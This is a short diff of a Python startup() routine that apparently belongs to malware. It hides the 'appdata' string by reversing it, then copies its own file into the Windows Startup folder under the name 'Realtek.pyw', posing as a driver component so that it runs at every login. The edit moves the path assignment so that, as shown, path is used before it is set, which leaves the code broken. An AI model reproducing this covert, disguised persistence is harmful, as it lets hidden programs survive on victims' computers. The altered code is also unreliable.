@@ -330,9 +330,9 @@ def startup():
     except:
         pass
     apppp = 'atadppa'
-    path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
     path = check_python_or_convert(path)
     if not isfile(path):
+        path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\"
         copy(__file__, path)
 
     else:
